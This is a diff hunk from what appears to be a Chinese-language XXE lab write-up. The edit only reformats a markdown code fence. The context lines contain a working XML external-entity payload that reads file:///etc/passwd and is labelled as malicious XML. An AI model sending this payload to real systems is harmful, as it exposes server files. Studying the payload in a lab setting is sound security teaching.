@@ -909,7 +909,8 @@ XXE Lab:
 \endcode  
 
 **恶意 XML：**  
-\```xml  
+\```
+xml  
 <?xml version="1.0" ?><!DOCTYPE thp [<!ELEMENT thp ANY><!ENTITY book SYSTEM "file:///etc/passwd">]><thp>黑客攻击 &book;</thp>
 \endcode  
 
